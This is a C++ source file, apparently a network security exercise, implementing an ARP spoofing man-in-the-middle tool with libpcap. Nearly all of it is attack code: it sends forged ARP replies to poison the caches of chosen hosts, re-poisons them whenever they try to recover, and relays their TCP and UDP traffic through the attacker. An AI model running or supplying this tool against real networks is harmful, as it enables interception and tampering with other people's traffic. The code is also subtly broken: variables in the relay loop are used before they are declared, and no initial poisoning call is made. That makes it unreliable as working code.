extern "C" {
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
}
#include <pcap.h>
#include <iostream>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <map>
#include "mac.h"
#include "ip.h"
#include "arphdr.h"
#include "ethhdr.h"
#include "iphdr.h"
#include <set>
#include <thread>
#include <vector>

#define PACKET_SIZE (sizeof(struct EthArpPacket))

std::set<Mac> maclist;
std::map<Ip, Mac> m;

struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};

void usage() {
    printf("syntax: arp_spoofing <interface> <sender ip> <target ip>\n");
    printf("sample: arp_spoofing wlan0 192.168.10.2 192.168.1\n");
}

typedef struct {
    const char* dev_;
} Param;

Param param = {
    .dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
    if (argc % 2 == 1) {
        usage();
        return false;
    }
    return true;
}

bool isArp(EthHdr ethhdr) {
    return ntohs(ethhdr.type_) == EthHdr::Arp;
}
bool ismypacket(ArpHdr arphdr, Ip sender_ip, Ip my_ip) {
    if (sender_ip == Ip(ntohl(arphdr.sip_))) {
        return my_ip == Ip(ntohl(arphdr.tip_));
    }
    return false;
}
void get_my_info(Ip* ip, Mac* mac) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1) {
        perror("socket");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    const char* iface = param.dev_;
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, strlen(iface));
    ifr.ifr_name[strlen(iface)] = '\0';

    if (ioctl(sockfd, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    char buf_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr, buf_ip, INET_ADDRSTRLEN);
    *ip = Ip(buf_ip);

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    unsigned char buf_mac[8];
    memcpy(buf_mac, ifr.ifr_hwaddr.sa_data, 6);
    *mac = Mac(buf_mac);

    close(sockfd);
}

void create_arp_request_packet(u_char* packet, Ip src_ip, Mac src_mac, Ip dst_ip, Mac dst_mac) {
    struct EthArpPacket* arp_packet = (EthArpPacket*)packet;
    EthHdr* ethhdr = &arp_packet->eth_;
    ArpHdr* arphdr = &arp_packet->arp_;

    ethhdr->dmac_ = dst_mac;
    ethhdr->smac_ = src_mac;
    ethhdr->type_ = htons(EthHdr::Arp);

    arphdr->hrd_ = htons(ArpHdr::ETHER);
    arphdr->pro_ = htons(EthHdr::Ip4);
    arphdr->hln_ = Mac::SIZE;
    arphdr->pln_ = Ip::SIZE;
    arphdr->op_ = htons(ArpHdr::Request);
    arphdr->smac_ = src_mac;
    arphdr->sip_ = htonl(src_ip);
    if (dst_mac.isBroadcast())
        arphdr->tmac_ = Mac::nullMac();
    else arphdr->tmac_ = dst_mac;
    arphdr->tip_ = htonl(dst_ip);
}

void get_sender_mac(pcap_t* pcap , Ip my_ip, Mac my_mac, Ip sender_ip, Mac* sender_mac, Ip target_ip) {

    struct pcap_pkthdr* header;
    u_char* request_packet = (u_char*)malloc(sizeof(struct EthArpPacket));
    create_arp_request_packet(request_packet, my_ip, my_mac, sender_ip, Mac::broadcastMac());
    if (pcap_sendpacket(pcap, request_packet, PACKET_SIZE) != 0) {
        fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
        exit(EXIT_FAILURE);
    }
    printf("ARP Request packet is sent\n");
    const u_char* reply_packet;
    int res;
    while ((res = pcap_next_ex(pcap, &header, &reply_packet)) >= 0) {
        if (res == 0) continue;//timout
        struct EthArpPacket* p = (struct EthArpPacket*)reply_packet;
        if (!isArp(p->eth_)) continue;
        if (ismypacket(p->arp_, sender_ip, my_ip)) {
            *sender_mac = p->arp_.smac_;
            m.insert({ sender_ip,*sender_mac });
            std::cout << "Get"<<std::string(*sender_mac) << std::endl;
            std::cout << "ARP Reply Packet is received" << std::endl;
            break;
        }

    }

}

void infect(pcap_t* pcap, Mac my_mac, Ip sender_ip, Mac sender_mac, Ip target_ip) {

    u_char* sender_infect_packet = (u_char*)malloc(sizeof(struct EthArpPacket));
    create_arp_request_packet(sender_infect_packet, target_ip, my_mac, sender_ip, sender_mac);

    if (pcap_sendpacket(pcap, sender_infect_packet, PACKET_SIZE) != 0) {
        fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
        exit(EXIT_FAILURE);
    }
    printf("ARP Spoofing Packet is successfully sent\n");
}



void handle_infection_and_relay(pcap_t* pcap, Mac my_mac, Ip sender_ip, Mac sender_mac, Ip target_ip, Mac target_mac) {
    int res;
    while ((res = pcap_next_ex(pcap, &header, &received_packet))>=0) {
        if (res == 0) continue;
        struct pcap_pkthdr* header;
        const u_char* received_packet;

        EthHdr* ethhdr = (EthHdr*)received_packet;
        Mac dmac = ethhdr->dmac_;
        Mac smac = ethhdr->smac_;
        uint16_t ip_type = ntohs(ethhdr->type_);

        //reInfect
        if ((dmac.isBroadcast()&&(ip_type==EthHdr::Arp)) || ((dmac == my_mac) && (ip_type == EthHdr::Arp))) {
            if (smac == sender_mac || smac == target_mac) {
                ArpHdr* arphdr = (ArpHdr*)(received_packet + sizeof(EthHdr));
                uint16_t hrd = ntohs(arphdr->hrd_);
                uint16_t pro = ntohs(arphdr->pro_);
                uint16_t op = ntohs(arphdr->op_);

                if ((hrd == ArpHdr::ETHER) && (pro == EthHdr::Ip4) && (op == ArpHdr::Request)) {
                    std::cout << "Recovery Request" << std::endl;

                    infect(pcap, my_mac, sender_ip, sender_mac, target_ip);
                    infect(pcap, my_mac, target_ip, target_mac, sender_ip);

                    std::cout << "ReInfect!!" << std::endl;
                    continue;
                }
            }
        }

        //packet relay
        if (ip_type == EthHdr::Ip4) {
            IpHdr* iphdr = (IpHdr*)(received_packet + sizeof(EthHdr));
            Ip sip = ntohl(iphdr->sip_);
            Ip dip = ntohl(iphdr->dip_);
            uint8_t ip_p = iphdr->ip_p_;

            if ((ip_p == TCP) || (ip_p == UDP)) {
                if (m.find(sip) != m.end() || m.find(dip) != m.end()) {
                    std::cout << "Relay packet" << std::endl;

                    if (ethhdr->smac_ != target_mac) {
                        ethhdr->dmac_ = target_mac;
                    } else {
                        ethhdr->dmac_ = m.find(dip)->second;
                    }

                    ethhdr->smac_ = my_mac;

                    if (pcap_sendpacket(pcap, received_packet, header->caplen) != 0) {
                        fprintf(stderr, "Error sending relay packet: %s\n", pcap_geterr(pcap));
                        exit(EXIT_FAILURE);
                    }

                    std::cout << "Relay packet sent successfully" << std::endl;
                }
            }
        }
    }
}

int main(int argc, char* argv[]) {
    if (!parse(&param, argc, argv))
        return -1;
    param.dev_ = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }

    Ip my_ip;
    Mac my_mac;
    get_my_info(&my_ip, &my_mac);

    int cur = 2;
    std::vector<std::thread> threads;

    while (cur < argc) {
        Ip sender_ip = Ip(argv[cur]);
        Mac sender_mac;
        Ip target_ip = Ip(argv[cur + 1]);
        Mac target_mac;

        if (m.find(sender_ip) == m.end()) {
            get_sender_mac(pcap, my_ip, my_mac, sender_ip, &sender_mac, target_ip);
        } else {
            sender_mac = m.find(sender_ip)->second;
        }

        if (m.find(target_ip) == m.end()) {
            get_sender_mac(pcap, my_ip, my_mac, target_ip, &target_mac, sender_ip);
        } else {
            target_mac = m.find(target_ip)->second;
        }

        threads.emplace_back(handle_infection_and_relay, pcap, my_mac, sender_ip, sender_mac, target_ip, target_mac);

        cur += 2;
    }

    for (auto& t : threads) {
        t.join();
    }

    pcap_close(pcap);
    return 0;
}

